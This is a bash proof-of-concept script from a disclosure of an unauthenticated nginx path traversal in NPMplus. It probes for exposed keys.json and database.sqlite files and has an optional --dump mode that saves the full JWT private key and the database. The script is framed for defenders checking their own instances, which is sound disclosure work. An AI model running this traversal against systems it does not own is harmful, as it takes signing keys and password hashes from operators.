#!/usr/bin/env bash
#
# NPMplus — unauthenticated nginx alias off-by-slash path traversal (CWE-22)
# CVE      : CVE-2026-102738             Advisory : GHSA-wj85-328x-ww6r
# Reporter : Lyris Vale (@ValeLyris)
# Affected : 2025-12-29-b1 <= v < 2026-07-23-r1      Fixed : 2026-07-23-r1
#
# The same requests filed upstream (see ../README.md), wrapped so a defender can run
# this against their own instance without pulling secrets onto disk. Every request is
# unauthenticated. Run it only against an instance you own or are authorised to test.
#
# Usage : ./poc.sh [HOST:PORT] [--dump DIR]        default target 127.0.0.1:8081
# Exit  : 0 no disclosure observed   1 AFFECTED   2 inconclusive / error

set -uo pipefail
umask 077

HOST="${1:-127.0.0.1:8081}"
case "$HOST" in ""|-*|*://*|*/*|*\?*|*\#*|*\@*|*[[:space:]]*) echo "usage: $0 [HOST:PORT] [--dump DIR]" >&2; exit 2;; esac
DUMP=""
if [ "${2:-}" = "--dump" ]; then
    DUMP="${3:-}"
    [ -n "$DUMP" ] || { echo "--dump needs a directory" >&2; exit 2; }
fi

C=(curl -sk --path-as-is --connect-timeout 5 --max-time 20)
U="https://${HOST}/images/gravatar.."
affected=0
inconclusive=0

curl_version=$(curl --version) || { echo "[?] curl unavailable" >&2; exit 2; }
read -r _ curl_version _ <<< "${curl_version%%$'\n'*}"
IFS=. read -r curl_major curl_minor _ <<< "$curl_version"
if ! [[ "$curl_major" =~ ^[0-9]+$ && "$curl_minor" =~ ^[0-9]+$ ]] ||
   (( curl_major < 8 || (curl_major == 8 && curl_minor < 4) )); then
    echo "[?] curl >= 8.4.0 required to bound response bodies" >&2
    exit 2
fi

request() {
    response=$("${C[@]}" "$@" -w $'\n%{http_code}' | tr -d '\0')
    request_rc=$?
    status="${response##*$'\n'}"
    body="${response%$'\n'*}"
}

blocked() {
    [[ "$status" = 403 || "$status" = 404 ]] &&
        [[ "$request_rc" = 0 || "$request_rc" = 63 ]]
}

echo "[*] target ${HOST} — CVE-2026-102738"

# 1. JWT signing key — inspect its shape without printing or saving its value.
request --max-filesize 65536 "${U}/keys.json"
if [ "$request_rc" -eq 0 ] && [ "$status" = 200 ] &&
   [[ "$body" = *'-----BEGIN PRIVATE KEY-----'* ]] &&
   printf '%s' "$body" | grep -q '"key"[[:space:]]*:'; then
    echo "[!] keys.json readable unauthenticated — PEM private-key marker confirmed"
    affected=1
elif blocked; then
    echo "[*] keys.json -> HTTP ${status}; no disclosure observed at this endpoint"
else
    echo "[?] keys.json -> HTTP ${status}, curl ${request_rc}; unexpected response — inconclusive"
    inconclusive=1
fi

# 2. Request only the 16-byte file magic; reject a larger response if Range is ignored.
request -r 0-15 --max-filesize 16 "${U}/database.sqlite"
if [ "$request_rc" -eq 0 ] && [[ "$status" = 200 || "$status" = 206 ]] &&
   [ "$body" = "SQLite format 3" ]; then
    echo "[!] database.sqlite readable unauthenticated — SQLite header confirmed"
    affected=1
elif blocked; then
    echo "[*] database.sqlite -> HTTP ${status}; no disclosure observed at this endpoint"
else
    echo "[?] database.sqlite -> HTTP ${status}, curl ${request_rc}; unexpected response — inconclusive"
    inconclusive=1
fi
unset body response

# 3. Controls — these hold on a patched instance too. They show the disclosure came from
#    traversal rather than from the files simply being published.
for path in /images/gravatar/ /keys.json; do
    if control=$("${C[@]}" -o /dev/null -w '%{http_code}' "https://${HOST}${path}"); then
        echo "[*] control ${path} -> HTTP ${control}"
    else
        echo "[?] control ${path} failed"
    fi
done

if [ -n "$DUMP" ]; then
    [ "$affected" -eq 1 ] || { echo "[?] no confirmed disclosure; dump skipped" >&2; exit 2; }
    mkdir -p -- "$DUMP" || exit 2
    if [ -e "$DUMP/keys.json" ] || [ -L "$DUMP/keys.json" ] ||
       [ -e "$DUMP/database.sqlite" ] || [ -L "$DUMP/database.sqlite" ]; then
        echo "[?] dump files already exist; choose an empty directory" >&2
        exit 2
    fi
    key_tmp=$(mktemp "$DUMP/.keys-XXXXXX") || exit 2
    db_tmp=$(mktemp "$DUMP/.database-XXXXXX") || { rm -f -- "$key_tmp"; exit 2; }
    trap 'rm -f -- "$key_tmp" "$db_tmp"' EXIT
    key_status=$("${C[@]}" "${U}/keys.json" -o "$key_tmp" -w '%{http_code}')
    key_rc=$?
    db_status=$("${C[@]}" "${U}/database.sqlite" -o "$db_tmp" -w '%{http_code}')
    db_rc=$?
    if [ "$key_rc" -ne 0 ] || [ "$db_rc" -ne 0 ] ||
       [ "$key_status" != 200 ] || [ "$db_status" != 200 ]; then
        echo "[?] full download failed; incomplete dump files removed" >&2
        exit 2
    fi
    mv -n -- "$key_tmp" "$DUMP/keys.json" &&
        mv -n -- "$db_tmp" "$DUMP/database.sqlite" || exit 2
    echo "[*] full copies written to ${DUMP} — sensitive signing key, password hashes and possible DNS credentials"
fi

if [ "$affected" -eq 1 ]; then
    echo "[RESULT] AFFECTED — update to a release containing the 2026-07-23-r1 fix and follow the credential-rotation guidance in ../README.md"
    exit 1
fi
if [ "$inconclusive" -eq 1 ]; then
    echo "[RESULT] inconclusive — verify the running image and routing; do not treat this as a clean result"
    exit 2
fi
echo "[RESULT] no disclosure observed at this endpoint — this does not establish that the installed build is patched"
exit 0
